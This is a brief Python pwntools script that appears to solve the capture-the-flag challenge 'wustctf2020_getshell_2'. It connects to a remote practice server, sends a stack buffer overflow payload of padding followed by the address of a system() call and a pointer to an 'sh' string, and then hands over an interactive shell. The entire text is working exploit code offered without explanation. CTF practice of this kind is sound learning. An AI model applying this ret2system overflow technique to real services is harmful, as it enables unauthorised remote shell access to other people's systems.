from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('wustctf2020_getshell_2')
io = remote('node4.buuoj.cn', 29147)
call_system = 0x08048529
sh = 0x08048670

payload = cyclic(0x1c) + p32(call_system) + p32(sh)
io.send(payload)
io.interactive()

